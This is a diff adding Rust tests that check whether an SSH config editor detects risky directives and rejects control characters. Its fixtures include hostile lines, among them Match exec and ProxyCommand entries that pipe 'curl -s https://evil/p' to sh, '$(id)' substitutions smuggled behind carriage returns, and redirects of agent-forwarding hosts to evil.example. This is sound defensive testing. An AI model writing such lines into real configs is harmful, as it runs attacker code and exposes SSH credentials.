@@ -354,6 +354,10 @@ fn rejects_invalid_edits() {
         edit(None, &["two words"], &[]),
         edit(None, &["#x"], &[]),
         edit(None, &["ok"], &[("User", "a\nb")]),
+        edit(None, &["ok"], &[("User", "a\rb")]),
+        edit(None, &["ok"], &[("HostName", "foo\x0c#$(id)")]),
+        edit(None, &["ok"], &[("RemoteForward", "1080\x0b\"\"")]),
+        edit(None, &["ok"], &[("User", "a\u{1b}[2Jb")]),
         edit(None, &["ok"], &[("User", "  ")]),
         edit(None, &["ok"], &[("Bad Key", "x")]),
         edit(None, &["ok"], &[("Host", "x")]),
@@ -539,6 +543,8 @@ fn finds_directives_that_run_code() {
             s(&host, "forwardagent", "yes"),
             s(&host, "ForwardX11Trusted", "yes"),
             s(&host, "XAuthLocation", "/opt/X11/bin/xauth"),
+            // Where the agent and display above go.
+            s(&host, "User", "me"),
             s(
                 &matched,
                 "Match",
@@ -591,6 +597,8 @@ fn every_spelling_ssh_accepts_counts() {
             "RemoteForward /tmp/a.sock ${SSH_AUTH_SOCK}",
             "RemoteForward 2375 /var/run/docker.sock",
             "RemoteForward 1080",
+            // Not a command: where the forwards above go.
+            "\"HostName\" example.com",
         ]
     );
 }
@@ -727,6 +735,352 @@ fn upsert_adds_risky_options_visibly() {
     assert_eq!(other.added_risky_directives(&before), []);
 }
 
+/// [`added`] with what each directive lets happen.
+fn added_risks(before: &str, after: &str) -> Vec<(Risk, String)> {
+    SshConfig::parse(after)
+        .added_risky_directives(&SshConfig::parse(before))
+        .into_iter()
+        .map(|d| {
+            let block = d.block.unwrap_or_default();
+            (d.risk, format!("{block} | {} {}", d.key, d.value))
+        })
+        .collect()
+}
+
+/// Lines that `ssh` (OpenSSH 9.9) reads past a carriage return or form feed
+/// this parser once took for whitespace before a comment: it runs the
+/// `exec`, and passes the name with `$(…)` to `%h` or the shell.
+const HIDDEN_BEHIND_CONTROLS: &[&str] = &[
+    "Match host *,x\r#y exec \"curl -s https://evil/p | sh\"",
+    "Match host *,x\x0c#y exec \"curl -s https://evil/p | sh\"",
+    "\"ProxyCommand\" none\r#$(curl -s https://evil/p | sh)",
+    "\"ProxyCommand\" none\x0c#$(curl -s https://evil/p | sh)",
+    "ProxyCommand none\r#$(id)",
+    "LocalCommand none\x0c#$(id)",
+    "HostName foo\r#$(id)",
+    "HostName foo\x0c#$(id)",
+    "\"HostName\" foo\r#$(id)",
+    "User me\r#$(id)",
+    "HostKeyAlias box\r#$(id)",
+    "ProxyJump jump\r#$(id)",
+    "RemoteForward 8080\r#x",
+];
+
+#[test]
+fn control_characters_hide_nothing() {
+    let base = "Host prod\n  HostName prod.example\n";
+    for payload in HIDDEN_BEHIND_CONTROLS {
+        for after in [
+            format!("{base}  {payload}\n"),
+            format!("{payload}\n{base}"),
+            format!("Host *\r\n  {payload}\r\n"),
+        ] {
+            // Shown whole, as code: the line may be anything to `ssh`.
+            let code: Vec<String> = SshConfig::parse(&after)
+                .added_risky_directives(&SshConfig::parse(base))
+                .into_iter()
+                .filter(|d| d.risk == Risk::RunsCode)
+                .map(|d| format!("{} {}", d.key, d.value))
+                .collect();
+            assert_eq!(code, [*payload], "{after:?}");
+        }
+        // The page cannot write such a line at all.
+        assert_eq!(
+            validate_text(&format!("{base}{payload}\n"))
+                .unwrap_err()
+                .code(),
+            ErrorCode::InvalidInput,
+            "{payload:?}"
+        );
+    }
+}
+
+#[test]
+fn quoted_keywords_are_read_like_plain_ones() {
+    // `ssh -G` reads `x foo`, `none #$(id)` and `x` as the command, and
+    // `"ProxyCommand" none` as none.
+    let found: Vec<String> = risky(
+        "Host *\n  Proxy\"Command\"x foo\n  \"ProxyCommand\" none #$(id)\n  \
+         \"ProxyCommand\"=x\n  \"ProxyCommand\" none\n  \"LocalCommand\"\tnone\n",
+    )
+    .into_iter()
+    .map(|(_, key, value)| format!("{key} {value}"))
+    .collect();
+    assert_eq!(
+        found,
+        [
+            "Proxy\"Command\" x foo",
+            "\"ProxyCommand\" none #$(id)",
+            "\"ProxyCommand\" x",
+        ]
+    );
+}
+
+#[test]
+fn remote_forward_with_an_empty_target_is_dynamic() {
+    // `ssh -G` reads these as `remoteforward 8080 [socks]:0`, like
+    // `RemoteForward 8080`.
+    for (line, value) in [
+        ("RemoteForward 8080 \"\"", "8080 \"\""),
+        ("RemoteForward 7070 ''", "7070 ''"),
+        ("RemoteForward 8080 \"\" # socks", "8080 \"\""),
+    ] {
+        assert_eq!(
+            added_risks("Host a\n", &format!("Host a\n  {line}\n")),
+            [(
+                Risk::ServerAccess,
+                format!("Host a | RemoteForward {value}")
+            )],
+            "{line}"
+        );
+    }
+    assert_eq!(
+        added("Host a\n", "Host a\n  RemoteForward 8080 localhost:3000\n"),
+        NOTHING
+    );
+    // Through the host editor too.
+    let before = SshConfig::parse("Host prod\n  HostName prod.example\n");
+    let mut after = before.clone();
+    after
+        .upsert_host(&edit(
+            Some(0),
+            &["prod"],
+            &[("HostName", "prod.example"), ("RemoteForward", "1080 \"\"")],
+        ))
+        .unwrap();
+    let added = after.added_risky_directives(&before);
+    assert_eq!(
+        added
+            .iter()
+            .map(|d| (d.risk, d.value.as_str()))
+            .collect::<Vec<_>>(),
+        // The server it goes to is shown too.
+        [
+            (Risk::Destination, "prod.example"),
+            (Risk::ServerAccess, "1080 \"\"")
+        ]
+    );
+}
+
+/// A block that forwards the agent, and one that does not.
+const FORWARDS: &str = "\
+Host work\n  HostName work.corp\n  User me\n  ForwardAgent yes\n\
+Host other\n  HostName other.example\n";
+
+fn s(risk: Risk, text: &str) -> (Risk, String) {
+    (risk, text.to_owned())
+}
+
+#[test]
+fn pointing_access_at_another_server_asks() {
+    use Risk::{Destination, HostKeys, ServerAccess};
+    let base = FORWARDS;
+
+    // The block that forwards the agent: where it goes.
+    assert_eq!(
+        added_risks(base, &base.replace("work.corp", "evil.example")),
+        [s(Destination, "Host work | HostName evil.example")]
+    );
+    for (to, found) in [
+        ("User attacker", "Host work | User attacker"),
+        ("User me\n  Port 2222", "Host work | Port 2222"),
+        (
+            "User me\n  ProxyJump j.example",
+            "Host work | ProxyJump j.example",
+        ),
+        (
+            "User me\n  HostKeyAlias other",
+            "Host work | HostKeyAlias other",
+        ),
+        (
+            "User me\n  CanonicalDomains evil.example",
+            "Host work | CanonicalDomains evil.example",
+        ),
+    ] {
+        assert_eq!(
+            added_risks(base, &base.replace("User me", to)),
+            [s(Destination, found)],
+            "{to}"
+        );
+    }
+    // A new name for the block: all of it is new there.
+    assert_eq!(
+        added_risks(base, &base.replace("Host work\n", "Host work evil\n")),
+        [
+            s(Destination, "Host work evil | HostName work.corp"),
+            s(Destination, "Host work evil | User me"),
+            s(ServerAccess, "Host work evil | ForwardAgent yes"),
+        ]
+    );
+    // Turning access on shows where it goes.
+    let plain = "Host work\n  HostName work.corp\n";
+    assert_eq!(
+        added_risks(plain, &format!("{plain}  ForwardX11 yes\n")),
+        [
+            s(Destination, "Host work | HostName work.corp"),
+            s(ServerAccess, "Host work | ForwardX11 yes"),
+        ]
+    );
+
+    // Anything else in that block, and every block no access applies to,
+    // asks nothing.
+    assert_eq!(
+        added(base, &base.replace("User me", "User me\n  Compression yes")),
+        NOTHING
+    );
+    assert_eq!(
+        added(base, &base.replace("other.example", "evil.example")),
+        NOTHING
+    );
+    assert_eq!(added(base, &format!("{base}  Port 2222\n")), NOTHING);
+    assert_eq!(
+        added(base, &format!("{base}Host db\n  HostName db.example\n")),
+        NOTHING
+    );
+
+    // The review's case, through the host editor.
+    let before = SshConfig::parse(base);
+    let mut after = before.clone();
+    after
+        .upsert_host(&edit(
+            Some(0),
+            &["work"],
+            &[
+                ("HostName", "evil.example"),
+                ("User", "me"),
+                ("ForwardAgent", "yes"),
+                ("StrictHostKeyChecking", "no"),
+                ("UserKnownHostsFile", "/dev/null"),
+            ],
+        ))
+        .unwrap();
+    assert_eq!(
+        after
+            .added_risky_directives(&before)
+            .into_iter()
+            .map(|d| (d.risk, format!("{} {}", d.key, d.value)))
+            .collect::<Vec<_>>(),
+        [
+            s(Destination, "HostName evil.example"),
+            s(HostKeys, "StrictHostKeyChecking no"),
+            s(HostKeys, "UserKnownHostsFile /dev/null"),
+        ]
+    );
+}
+
+#[test]
+fn access_reaches_every_block_that_may_match_its_host() {
+    // Access for any host applies to every block, and a block for any host
+    // may reach the hosts of a block with access. So may another block for
+    // the same name, in any case.
+    for config in [
+        "ForwardAgent yes\nHost work\n  HostName work.corp\n",
+        "Host work\n  HostName work.corp\nHost *\n  ForwardAgent yes\n",
+        "Host work\n  HostName work.corp\nMatch user me\n  ForwardAgent yes\n",
+        "Host *.corp\n  HostName work.corp\nHost a.corp\n  ForwardAgent yes\n",
+        "Host w?rk*\n  HostName work.corp\nHost a work-1\n  ForwardAgent yes\n",
+        "Host *.corp\n  HostName work.corp\nHost w*\n  ForwardAgent yes\n",
+        "Host Work\n  HostName work.corp\nHost work\n  ForwardAgent yes\n",
+    ] {
+        let found = added_risks(config, &config.replace("work.corp", "evil.example"));
+        assert_eq!(found.len(), 1, "{config}");
+        assert_eq!(found[0].0, Risk::Destination, "{config}");
+    }
+    // A pattern that cannot match the names of the block with access.
+    for config in [
+        "Host *.corp\n  HostName work.corp\nHost web\n  ForwardAgent yes\n",
+        "Host w?rk\n  HostName work.corp\nHost works\n  ForwardAgent yes\n",
+        // Many stars take no long.
+        &format!(
+            "Host {}b\n  HostName work.corp\nHost {}\n  ForwardAgent yes\n",
+            "*a".repeat(40),
+            "a".repeat(200)
+        ),
+    ] {
+        assert_eq!(
+            added(config, &config.replace("work.corp", "evil.example")),
+            NOTHING,
+            "{config}"
+        );
+    }
+    // A new block that takes a name over.
+    assert_eq!(
+        added(
+            "Host work\n  ForwardAgent yes\n",
+            "Host work\n  HostName evil.example\nHost work\n  ForwardAgent yes\n"
+        ),
+        ["Host work | HostName evil.example"]
+    );
+    // Not one that only excludes the name.
+    assert_eq!(
+        added(
+            "Host work\n  ForwardAgent yes\n",
+            "Host db !work\n  HostName db.example\nHost work\n  ForwardAgent yes\n"
+        ),
+        NOTHING
+    );
+}
+
+#[test]
+fn checking_servers_less_strictly_asks() {
+    let base = FORWARDS;
+    // In any block, whatever access it gives.
+    for weaker in [
+        "StrictHostKeyChecking no",
+        "StrictHostKeyChecking off",
+        "StrictHostKeyChecking accept-new",
+        "UserKnownHostsFile /dev/null",
+        "GlobalKnownHostsFile /tmp/known",
+        "VerifyHostKeyDNS yes",
+        "NoHostAuthenticationForLocalhost yes",
+    ] {
+        assert_eq!(
+            added_risks(base, &format!("{base}  {weaker}\n")),
+            [s(Risk::HostKeys, &format!("Host other | {weaker}"))],
+            "{weaker}"
+        );
+    }
+    for same in [
+        "StrictHostKeyChecking yes",
+        "StrictHostKeyChecking ask",
+        "VerifyHostKeyDNS no",
+        "VerifyHostKeyDNS ask",
+        "NoHostAuthenticationForLocalhost no",
+        "CheckHostIP no",
+    ] {
+        assert_eq!(added(base, &format!("{base}  {same}\n")), NOTHING, "{same}");
+    }
+}
+
+#[test]
+fn raw_text_with_control_characters_is_refused() {
+    for ok in [
+        "",
+        "Host a\n",
+        "Host a\r\n\tUser b\r\n",
+        "Host a\r",
+        "# ünïcode \u{feff}\ttab\n",
+    ] {
+        validate_text(ok).unwrap();
+    }
+    for bad in [
+        "Host a\rUser b\n",
+        "Host a\r\r\n",
+        "HostName a\x0c\n",
+        "User a\0\n",
+        "Host a\n\x1b[2J\n",
+        "Host a\u{85}\n",
+    ] {
+        assert_eq!(
+            validate_text(bad).unwrap_err().code(),
+            ErrorCode::InvalidInput,
+            "{bad:?}"
+        );
+    }
+    let error = validate_text("Host a\r\nUser b\x0c\r\n").unwrap_err();
+    assert!(error.to_string().contains("line 2"), "{error}");
+}
+
 #[test]
 fn revision_is_the_hash_of_the_file() {
     let home = tempfile::tempdir().unwrap();
@@ -840,4 +1194,43 @@ fn openssh_accepts_edited_config() {
         "{stdout}"
     );
     assert!(stdout.contains("serveraliveinterval 60"));
+}
+
+/// Checks that OpenSSH reads odd lines as the lexer does. Nothing here runs:
+/// `ssh -G` prints a `ProxyCommand` without starting it.
+#[test]
+#[ignore = "needs the ssh binary"]
+fn openssh_reads_odd_lines_like_the_lexer() {
+    let dir = tempfile::tempdir().unwrap();
+    let path = dir.path().join("config");
+    for (line, printed) in [
+        ("HostName foo\r#bar", "hostname foo\r#bar"),
+        ("HostName foo\x0c#bar", "hostname foo\x0c#bar"),
+        ("User a #b", "user a"),
+        ("\"User\"=bob", "user =bob"),
+        (
+            "\"ProxyCommand\" none\r#$(true)",
+            "proxycommand none\r#$(true)",
+        ),
+        ("Proxy\"Command\"x foo", "proxycommand x foo"),
+        ("\"ProxyCommand\"=x", "proxycommand x"),
+    ] {
+        let text = format!("Host *\n  {line}\n");
+        fs::write(&path, &text).unwrap();
+        let out = std::process::Command::new("ssh")
+            .arg("-G")
+            .arg("-F")
+            .arg(&path)
+            .arg("somehost")
+            .output()
+            .unwrap();
+        let stdout = String::from_utf8_lossy(&out.stdout);
+        assert!(stdout.lines().any(|l| l == printed), "{line:?}: {stdout}");
+        let option = &SshConfig::parse(&text).hosts()[0].options[0];
+        assert_eq!(
+            Some(option.value.as_str()),
+            printed.split_once(' ').map(|(_, value)| value),
+            "{line:?}"
+        );
+    }
 }
